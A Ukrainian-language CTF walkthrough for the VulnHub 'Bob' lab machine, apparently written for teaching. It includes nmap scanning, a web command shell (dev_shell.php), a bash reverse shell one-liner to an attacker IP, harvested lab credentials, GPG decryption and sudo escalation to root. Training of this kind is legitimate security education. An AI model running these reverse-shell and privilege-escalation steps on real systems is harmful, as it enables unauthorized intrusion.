В цьому документі наведено розгорнуте пояснення до завдання **Capture the Flag (CTF)**, опубліковане на сайті **VulnHub** автором **"BOB"**. Відповідно до наданої автором інформації, рівень складності цього CTF — **ЛЕГКИЙ-СЕРЕДНІЙ**, а мета — отримати **root-доступ** до цільової машини та знайти **файли-флаги**.  

Для проходження цього CTF необхідно володіти:
- **базовим знанням команд Linux**
- **розумінням мережевих сервісів**
- **навичками використання інструментів для тестування на проникнення**
- **базовим розумінням мов програмування (Python, PHP)**

Завантажити CTF можна [тут](https://www.vulnhub.com/entry/bob-101,226/).  


> ⚠️ **Примітка**: Для запуску всіх цих вразливих машин було використано **Oracle VirtualBox**. Для проходження CTF використано **Kali Linux** або  **ParrotOS** як атакуючу машину. Використані методики призначені **виключно для освітніх цілей**. <br>
**Відповідальность за їх застосування проти будь-яких інших цілей буде визначатись відповідно чинному законодавству.**  

---

## **Короткий огляд кроків вирішення CTF**

1. Отримати **IP-адресу цільової машини** (**netdiscover**).
2. Просканувати **відкриті порти цільової машини** (**nmap**).  
3. Перевірити **HTTP-сервіс** та знайти підказки.  
4. Зробити підвищення привілеїв  
   

---

### 1. Отримання **IP-адресу цільової машини**

```sh
sudo netdiscover -r 10.0.2.0/24
```
![Результат](./bob/image-1.png)

***** Питання: яка з команд будк працювати швидче?
sudo netdiscover -r 10.0.2.0/24
або 
nmap -sV 10.0.2.0/24 


### 2. Сканування **відкритих портів цільової машини**.

Можна зробити різними шляхами:

```sh
sudo nmap -A --reason 10.0.2.13
```
або
```sh
sudo nmap -sV --reason 10.0.2.13
```
***** Питання: в чому різниця між цима командами (декілька вірних варіантів)

Отримуємо наступне:

![приклад використання nmap](./bob/image.png)

Як бачимо, в нас є умовний доступ лише до вебверверу, то можна спробувати розширене сканування за допомогою **nmap**
```sh
nmap -sC -sV -p- -oN tcp_scan 10.0.2.13
```
**Детальний опис:**
-sC — Default Scripts

Запускає набір стандартних NSE-скриптів (Nmap Scripting Engine).

**Що робить:**

- визначає банери сервісів;
- перевіряє типові конфігураційні помилки;
- збирає базову інформацію (HTTP titles, robots.txt, SSL-сертифікати тощо).

Це не агресивний, але інформативний рівень сканування.

-sV - Service Version Detection

Визначає версії сервісів, що працюють на відкритих портах.

**Що робить:**

відправляє спеціальні probe-пакети;

аналізує відповіді сервісів;

визначає ПЗ + версію (наприклад, Apache 2.4.49, OpenSSH 8.2p1).

**Причина:**

- пошук відомих CVE;
- підбір експлойтів;
- оцінка застарілості сервісів.

-p- - Scan All TCP Ports

Сканує всі 65 535 TCP-портів, а не лише топ-1000.

**За замовчуванням:**

nmap → сканує тільки 1000 найпопулярніших портів


**Флаг** -p-:

- знаходить нестандартні сервіси;
- виявляє бекдори;
- дозволяє побачити сервіси на нетипових портах (наприклад, 8081, 2222).

**Мінус** - сканування повільніше.

-oN tcp_scan - Normal Output

Зберігає результати сканування у файл:

**tcp_scan**

**Формат**:

людиночитабельний (normal);
зручний для:
- звіту;
- логування;
- додавання до CTF write-up.

![nmap_extended](./bob/image-2.png)

Таким чином знайшли ssh-сервіс, якому змінили порт (один із способів захисту)


### 3. Дослідження вебсервера

У браузері відкриваємо http://10.0.2.13,  отримуємо:
![main_page](./bob/image-3.png)


Передивимось **robots.txt**:
![robots.txt](./bob/image-4.png)

Після перегляду всіх сторінок, що ми знайшли, подальшу увагу приділимо
**http://10.0.2.13/dev_shell.php**
та спробуємо ввести команди bash, наприклад: **w, id, pwd** тощо.
Бачимо, що деякі команди відпрацьовують коректно, та можемо встановити користувача від якого виконуються ці команди.

![dev_shell.php_id](./bob/image-5.png)

Такий результат дає можливість спробувати отримати реверс-шел, то почнемо:
```sh
nc -lvnp 3421
```
![nc -lvnp 3421](./bob/image-6.png)

Для створення реверсшелу на боці цілі можемо скористатись 
[ресурсом  GutHub:](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp)

**Зверніть увагу на синтаксис:**

```sh
bash -c 'bash -i >& /dev/tcp/10.0.2.4/3421 0>&1'
```
вводимо цей рядок у форму **http://10.0.2.13/dev_shell.php**
![dev_shell_reverse](./bob/image-7.png)

Та отримуємо наступний результат:
![reverse_shell](./bob/image-8.png)

Робимо перевірку повноважень sudo:

```sh
sudo -l
```
Отримуємо результат:
![sudo -l](./bob/image-9.png)

Спробуємо перевірити домашні каталогі:
![ls /home](./bob/image-10.png)

Почнемо певно з директорії **/home/bob**
Для виводу прихованих файлів скористаємось командою:
```sh
ls -la
``` 
Отримуємо результат:
![.old_passwordfile.html](./bob/image-11.png)

Маємо наступні креди:
![creds](./bob/image-12.png)
**jc:Qwerty**
**seb:T1tanium_Pa$$word_Hack3rs_Fear_M3**

Перевіряємо інші домані каталогі:
Маємо цікавий файл.
![theadminisdumb.txt](./bob/image-13.png)

Визначаємо зміст:
![theadminisdumb](./bob/image-14.png)

**elliot:theadminisdumb**

Спроба зайті під ssh ні до чого не призводить, маємо відмову при з'єднанні:


То починаємо більш детально досліджувати директорію **/home/bob**
![cat staff.txt](./bob/image-16.png)
**cat staff.txt** - це скоріше про інтригі в команді
![cat login.txt.gpg](./bob/image-17.png) 
Розширення “.gpg” вказує на те, що файл зашифрований за допомогою GPG (GNU Privacy Guard) або GnuPG. GPG — це безкоштовне програмне забезпечення з відкритим кодом, яке забезпечує криптографічну конфіденційність та автентифікацію під час обміну даними.
Спроба відкрити цей файл вимагає ключ дешифрування, якого у нас немає.
Тобто загальний вигляд викрристання наступний:
```sh
gpg --batch --yes --passphrase 'PASSWORD_PHRASE' -o login.txt -d login.txt.gpg
```
![notes.sh](./bob/image-15.png) - а це те, чим можна скористатись.

Для  перевірки, що це не випадкова послідовність, перевіримо гуглом:
![Harpocrates](./bob/image-18.png)

Під користувачем **www-data** немає можливості запустити **gpg**, то користуємось 
знайденими кредами:
![gpg2work](./bob/image-19.png)
Спробуємо розшифрувати **login.txt.gpg**
```sh
gpg --batch --yes --passphrase 'HARPOCRATES' -d login.txt.gpg
```
Розшифрований файл має вигляд:
![bob:b0bcat_](./bob/image-20.png)

Наступним кроком спробуємо залогінуватись під користувачем **bob**.
Маємо позитивний результат.

![su bob](./bob/image-21.png)

Перевіремо наші дозволи за допомогою **sudo -l**.
Результат - користувач bob має root привілеї.

![sudo -l](./bob/image-22.png)

Переходимо в рута за допомогою команди ***sudo -i*
Результат - стали рутом.

![sudo -i](./bob/image-23.png)

Знаходимо flag.txt та виводимо його зміст.

![cat flag.txt](./bob/image-24.png)


Вітання, CTF VM Bob пройдена!
